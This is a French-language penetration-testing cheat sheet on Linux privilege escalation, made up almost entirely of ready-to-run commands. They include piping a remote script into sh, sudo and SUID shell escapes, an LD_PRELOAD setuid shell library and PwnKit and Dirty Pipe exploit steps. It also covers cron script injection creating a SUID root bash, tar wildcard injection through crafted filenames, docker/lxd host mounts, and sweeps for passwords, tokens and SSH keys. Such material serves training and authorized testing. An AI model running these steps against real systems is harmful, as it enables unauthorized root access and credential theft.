# 25 — Linux Privilege Escalation

## Objectifs
Passer d'un utilisateur standard à root : énumération automatique, sudo, SUID/SGID, capabilities, cron, PATH, NFS, kernel, secrets.

---

## 1. Énumération automatique

```bash
# LinPEAS
curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh
./linpeas.sh -a 2>&1 | tee linpeas.txt

# LinEnum
./LinEnum.sh -t -r report.txt

# linux-exploit-suggester
./linux-exploit-suggester.sh
```

### Commandes manuelles de base
```bash
id; whoami; hostname
uname -a; cat /etc/os-release; cat /proc/version
sudo -l
cat /etc/passwd; cat /etc/group
env
cat ~/.bash_history
ls -la /home/*; ls -la /root 2>/dev/null
ps aux --forest
ss -tulpn; netstat -tulpn
mount; df -h
crontab -l; ls -la /etc/cron*
find / -name "*.conf" -o -name "*.bak" -o -name "id_rsa" 2>/dev/null
```

---

## 2. Sudo

```bash
sudo -l
# (ALL) NOPASSWD: /usr/bin/vim
```

### GTFOBins
```bash
# vim
sudo vim -c ':!/bin/sh'
# less / more
sudo less /etc/passwd   # puis :!/bin/sh
# find
sudo find / -exec /bin/sh \; -quit
# awk
sudo awk 'BEGIN {system("/bin/sh")}'
# python / perl / ruby
sudo python3 -c 'import os;os.system("/bin/sh")'
# tar
sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
# env
sudo env /bin/sh
# nmap (ancien)
sudo nmap --interactive   # !sh
```

### LD_PRELOAD
```c
// shell.c
#include <stdio.h>
#include <unistd.h>
__attribute__((constructor)) void init(){ setuid(0); system("/bin/bash"); }
```
```bash
gcc -fPIC -shared -o shell.so shell.c
sudo LD_PRELOAD=/tmp/shell.so <commande autorisée>
```

### Sudoers mal configuré
```bash
sudo -l
# (root) NOPASSWD: /usr/bin/find
# → GTFOBins
# (ALL : ALL) ALL avec mot de passe connu
sudo su -
```

### CVE-2021-3156 (Baron Samedit)
```bash
sudoedit -s '\' $(python3 -c 'print("A"*1000)')
# exploit public sur GitHub
```

---

## 3. SUID / SGID

```bash
# Trouver
find / -perm -4000 -type f 2>/dev/null
find / -perm -2000 -type f 2>/dev/null
find / -perm -u=s -o -perm -g=s 2>/dev/null

# Vérifier avec GTFOBins
# Exemples
/usr/bin/pkexec          # CVE-2021-4034 (PwnKit)
/usr/bin/sudo            # Baron Samedit
/usr/bin/bash -p         # si SUID sur bash
/usr/bin/cp              # copier /etc/passwd modifié
/usr/bin/find            # -exec /bin/sh -p \;
/usr/bin/nmap            # --interactive
```

```bash
# bash SUID
/usr/bin/bash -p
# find SUID
find . -exec /bin/sh -p \; -quit
```

### PwnKit
```bash
git clone https://github.com/ly4k/PwnKit
cd PwnKit && make && ./PwnKit
```

### Bibliothèque partagée
```bash
# Binaire SUID qui charge une lib manquante
ldd /usr/bin/<SUID_BIN>
# Si une lib est dans un dossier courant / writable → hijack
echo 'void __attribute__((constructor)) init(){setuid(0);system("/bin/sh");}' > /tmp/x.c
gcc -shared -fPIC -o /path/lib.so /tmp/x.c
```

---

## 4. Capabilities

```bash
getcap -r / 2>/dev/null
# ex: /usr/bin/python3 = cap_setuid+ep
```

```bash
# cap_setuid
python3 -c 'import os;os.setuid(0);os.system("/bin/bash")'
# cap_dac_read_search
# cap_net_raw → sniff
# cap_sys_admin → mount
```

---

## 5. Cron & tâches planifiées

```bash
cat /etc/crontab
ls -la /etc/cron.d /etc/cron.daily /etc/cron.hourly
crontab -l
systemctl list-timers --all

# pspy (observer les processus)
./pspy64 -pf -i 1000
```

### Script writable exécuté par root
```bash
# Si /opt/backup.sh appartient à root mais writable par nous
echo 'cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash' >> /opt/backup.sh
# Attendre le cron
/tmp/rootbash -p
```

### Wildcard injection (tar / rsync)
```bash
# cron : tar czf backup.tar.gz *
cd /var/backups
echo 'echo "touch /tmp/pwned" > /tmp/x.sh' > x.sh
chmod +x x.sh
touch -- '--checkpoint=1'
touch -- '--checkpoint-action=exec=sh /tmp/x.sh'
# Attendre l'exécution
```

### PATH hijack
```bash
# Cron appelle "backup" sans chemin absolu
echo '/bin/sh' > /tmp/backup && chmod +x /tmp/backup
export PATH=/tmp:$PATH
# ou écrire dans un dossier du PATH déjà writable
```

---

## 6. NFS & partages

```bash
showmount -e <TARGET>
# no_root_squash + écriture
sudo mount -t nfs <TARGET>:/<EXPORT> /mnt/nfs -o nolock
cp /bin/bash /mnt/nfs/bash && chmod +s /mnt/nfs/bash
# Sur la cible :
/<EXPORT>/bash -p
```

---

## 7. Kernel exploits

```bash
uname -a
cat /etc/os-release
# Recherche
./linux-exploit-suggester.sh
searchsploit linux kernel <VERSION>
```

| CVE | Cible |
|---|---|
| CVE-2021-4034 | PwnKit (pkexec) |
| CVE-2021-3156 | Baron Samedit (sudo) |
| CVE-2016-5195 | Dirty COW (kernel 2.6–4.8) |
| CVE-2022-0847 | Dirty Pipe (5.8–5.16) |
| CVE-2019-13272 | ptrace (4.10–5.1.17) |
| CVE-2017-16995 | BPF (Ubuntu 16.04) |

```bash
# DirtyPipe
gcc dirtypipez.c -o dirtypipez && ./dirtypipez /usr/bin/su
```

---

## 8. Secrets & fichiers intéressants

```bash
# Historique
cat ~/.bash_history; cat ~/.zsh_history
# Configs
find / -name "*.conf" -o -name "*.config" -o -name "*.ini" 2>/dev/null
grep -ri "password\|passwd\|secret\|api_key\|token" /var/www /home /opt 2>/dev/null
# Clés SSH
find / -name "id_rsa" -o -name "id_ed25519" -o -name "*.ppk" 2>/dev/null
# Bases
find / -name "*.db" -o -name "*.sqlite" 2>/dev/null
# Logs
cat /var/log/auth.log
# Docker
ls -la /var/run/docker.sock
docker -H unix:///var/run/docker.sock run -v /:/mnt --rm -it alpine chroot /mnt sh
# systemd
systemctl list-units --type=service
```

### Groupes privilégiés
```bash
# docker
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
# lxd
lxc image import alpine.tar.gz --alias a
lxc init a c -c security.privileged=true
lxc config device add c host disk source=/ path=/mnt/root recursive=true
lxc start c && lxc exec c /bin/sh
# disk
debugfs /dev/sda1
# adm (logs)
```

---

## 9. Éditeurs & binaires interactifs

```bash
# Échappement depuis un éditeur/pager lancé en root
vi  → :!/bin/sh
vim → :set shell=/bin/sh  puis :shell
less → !/bin/sh
more → !/bin/sh
nano → Ctrl+R Ctrl+X puis commande
man  → !/bin/sh
ftp  → !/bin/sh
```

---

## 10. Checklist

- [ ] `id`, `sudo -l`, `uname -a`
- [ ] LinPEAS exécuté et analysé
- [ ] SUID/SGID + GTFOBins
- [ ] Capabilities
- [ ] Cron / timers / pspy
- [ ] Services & sockets
- [ ] Fichiers writable par l'utilisateur
- [ ] Secrets (historique, configs, clés)
- [ ] Kernel / CVE
- [ ] Groupes privilégiés (docker, lxd, disk)
- [ ] Root obtenu + preuve

## Commandes one-liners
```bash
# Tous les SUID hors binaires standards
find / -perm -4000 -type f 2>/dev/null | tee suid.txt
# Fichiers writable
find / -writable -type f 2>/dev/null | grep -v proc
# Dossiers writable
find / -writable -type d 2>/dev/null
# Credentials
grep -rEi "pass(word)?|secret|token" /etc /opt /home /var/www 2>/dev/null
```
